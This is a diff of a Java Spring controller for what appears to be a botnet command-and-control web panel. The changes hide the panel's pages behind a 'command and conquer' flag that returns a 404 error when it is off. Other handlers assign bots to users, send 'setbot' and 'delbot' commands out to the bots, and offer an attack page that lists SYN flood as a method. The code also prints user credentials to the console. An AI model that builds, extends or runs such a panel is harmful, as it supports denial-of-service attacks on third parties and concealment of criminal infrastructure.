@@ -72,7 +72,6 @@ public class SiteController {
 	public String login(HttpServletResponse error, HttpServletResponse httpServletResponse) throws IOException {
 		String result = "";
 		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-		System.out.println("ciccio stampa false "+configEngine.isCommandandconquerStatus());
 		System.out.println(" "+ auth.getName());
 		if (configEngine.isCommandandconquerStatus()) {
 			
@@ -91,20 +90,17 @@ public class SiteController {
 	public String index(HttpServletResponse error, HttpServletResponse httpServletResponse) throws IOException {
 		String result = "redirect:/site/login";
 		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-		System.out.println("ciccio stampa false "+configEngine.isCommandandconquerStatus());
 		System.out.println(" "+ auth.getName());
-		System.out.println(" "+ auth.getPrincipal().toString());
 		if(auth.getCredentials()!=null)
 		System.out.println(" "+ auth.getCredentials().toString());
 
 		User usr =uServ.findBySsoId(auth.getName());
 		if(usr!=null)
 			System.out.println(usr.getFirstName());
-		else System.out.println("user not found");
+		else System.out.println("User not found");
 
 		if (configEngine.isCommandandconquerStatus()) {
 			
-				System.out.println("sei qualcuno");
 				Collection<? extends GrantedAuthority> x = (auth.getAuthorities());
 				for (GrantedAuthority gA : x) {
 					System.out.println("ga " + gA.toString() + "  " + gA.toString().contains("ROLE_ADMIN"));
@@ -171,35 +167,45 @@ public class SiteController {
 
 	/**
 	 * This method will provide the medium to add a new user.
+	 * @throws IOException 
 	 */
 	@RequestMapping(value = { "/user/showbot" }, method = RequestMethod.GET)
-	public ModelAndView showBot() {
-		ModelAndView mav = new ModelAndView("userbotlist");
-		Authentication auth = SecurityContextHolder.getContext().getAuthentication();
-		String idUser = auth.getName();
-		User usr = uServ.findBySsoId(idUser);
-		List<Bot> botList = bServ.findAll();
-		if (usr != null)
-			if (botList != null) {
-				for (Integer i = 0; i < botList.size(); i++) {
-					Bot bot = botList.get(i);
-					if (bot.getBotUser() != null) {
-						if (!usr.equals(bot.getBotUser())) {
+	public ModelAndView showBot(HttpServletResponse error) throws IOException {
+		
+		ModelAndView mav = new ModelAndView("");		
+		if (configEngine.isCommandandconquerStatus()) {
+			mav = new ModelAndView("userbotlist");
+			Authentication auth = SecurityContextHolder.getContext().getAuthentication();
+			String idUser = auth.getName();
+			User usr = uServ.findBySsoId(idUser);
+			List<Bot> botList = bServ.findAll();
+			if (usr != null)
+				if (botList != null) {
+					for (Integer i = 0; i < botList.size(); i++) {
+						Bot bot = botList.get(i);
+						if (bot.getBotUser() != null) {
+							if (!usr.equals(bot.getBotUser())) {
+								botList.remove(bot);
+							}
+						} else
 							botList.remove(bot);
-						}
-					} else
-						botList.remove(bot);
-				}
-				mav.addObject("bots", botList);
-			}
+					}
+					mav.addObject("bots", botList);
+				}			
+		}
+		else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
 		return mav;
 	}
 
 	/**
 	 * This method will provide the medium to add a new user.
+	 * @throws IOException 
 	 */
 	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.GET)
-	public String addBot(ModelMap model) {
+	public String addBot(ModelMap model,HttpServletResponse error) throws IOException {
+		if (configEngine.isCommandandconquerStatus()) {
 		model.addAttribute("linkBot", new LinkBot());
 		List<Bot> botList = bServ.findAll();
 		if (botList != null)
@@ -212,10 +218,16 @@ public class SiteController {
 		model.addAttribute("bots", botList);
 		model.addAttribute("users", uServ.findAll());
 		return "addbot";
+		}
+		else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return null;
 	}
 
 	@RequestMapping(value = { "/admin/addbot" }, method = RequestMethod.POST)
-	public ModelAndView addBot(@ModelAttribute("linkBot") LinkBot lb) {
+	public ModelAndView addBot(@ModelAttribute("linkBot") LinkBot lb,HttpServletResponse error) throws IOException {
+		if (configEngine.isCommandandconquerStatus()) {
 		Bot bot = bServ.searchBotID(lb.getIdBotL());
 		User usr = uServ.findById(lb.getIdUsrL());
 		bot.setBotUser(usr);
@@ -223,21 +235,34 @@ public class SiteController {
 		String cmd = "setbot<BU>" + usr.getSsoId() + "<BU>" + bot.getIdBot();
 		cmm.floodingByCecToBot(cmd, usr.getSsoId());
 		return new ModelAndView("redirect:/site/admin/addbot");
+		}
+		else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return null;
 	}
 
 	/**
 	 * This method will provide the medium to add a new user.
+	 * @throws IOException 
 	 */
 	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.GET)
-	public String removeBot(ModelMap model) {
+	public String removeBot(ModelMap model,HttpServletResponse error) throws IOException {
+		if (configEngine.isCommandandconquerStatus()) {
 		model.addAttribute("usr", new User());
 		model.addAttribute("users", uServ.findAll());
 
 		return "deletebot";
+		}
+		else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return null;
 	}
 
 	@RequestMapping(value = { "/admin/removeallbot" }, method = RequestMethod.POST)
-	public ModelAndView removeBot(@ModelAttribute("usr") User usr) {
+	public ModelAndView removeBot(@ModelAttribute("usr") User usr,HttpServletResponse error) throws IOException {
+		if (configEngine.isCommandandconquerStatus()) {
 		usr = uServ.findById(usr.getId());
 		List<Bot> botList = bServ.findAll();
 		List<Bot> botList2 = new ArrayList<Bot>();
@@ -255,39 +280,48 @@ public class SiteController {
 		String cmd = "delbot<BU>" + usr.getSsoId();
 		cmm.floodingByCecToBot(cmd, usr.getSsoId());
 		return new ModelAndView("redirect:/site/admin/removeallbot");
+		}
+		else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return null;
 	}
 
 	/**
 	 * This method will provide the medium to add a new user.
+	 * @throws IOException 
 	 */
 	@RequestMapping(value = { "/admin/newuser" }, method = RequestMethod.GET)
-	public String newUser(ModelMap model) {
+	public String newUser(ModelMap model,HttpServletResponse error) throws IOException {
+		if (configEngine.isCommandandconquerStatus()) {
 		User user = new User();
 		model.addAttribute("roles", rServ.findAll());
 		model.addAttribute("user", user);
 		model.addAttribute("edit", false);
 		model.addAttribute("loggedinuser", getPrincipal());
 		return "registration";
+		}else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return null;
 	}
 
 	/**
 	 * This method will be called on form submission, handling POST request for
 	 * saving user in database. It also validates the user input
+	 * @throws IOException 
 	 */
 	@RequestMapping(value = { "/admin/newuser" }, method = RequestMethod.POST)
-	public String saveUser(@Valid User user, BindingResult result, ModelMap model) {
-
+	public String saveUser(@Valid User user, BindingResult result, ModelMap model,HttpServletResponse error) throws IOException {
+		if (configEngine.isCommandandconquerStatus()) {
 		if (result.hasErrors()) {
-			System.out.println("1 " + result.toString());
 			return "registration";
 		}
 
 		if (uServ.findBySsoId(user.getSsoId()) != null) {
-			System.out.println("2");
 			return "registration";
 		} else {
 
-			System.out.println("3 " + user.toString());
 
 			uServ.saveCrypto(user);
 
@@ -295,6 +329,10 @@ public class SiteController {
 			model.addAttribute("loggedinuser", getPrincipal());
 			return "registration";
 		}
+		}else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return null;
 	}
 
 	private String getPrincipal() {
@@ -319,8 +357,8 @@ public class SiteController {
 	}
 
 	@RequestMapping(value = { "/user/attack" }, method = RequestMethod.GET)
-	public String attack(ModelMap model) {
-
+	public String attack(ModelMap model,HttpServletResponse error) throws IOException {
+		if (configEngine.isCommandandconquerStatus()) {
 		Target target = new Target();
 		List<Target> attack = new ArrayList<Target>();
 		attack.add(new Target("synflood"));
@@ -329,6 +367,10 @@ public class SiteController {
 		model.addAttribute("target", target);
 
 		return "attack";
+		}else {
+			error.sendError(HttpStatus.SC_NOT_FOUND);
+		}
+		return null;
 	}
 
 	@RequestMapping(value = { "/user/attack" }, method = RequestMethod.POST)
@@ -346,4 +388,7 @@ public class SiteController {
 		}
 	}
 
+	
+
+	
 }
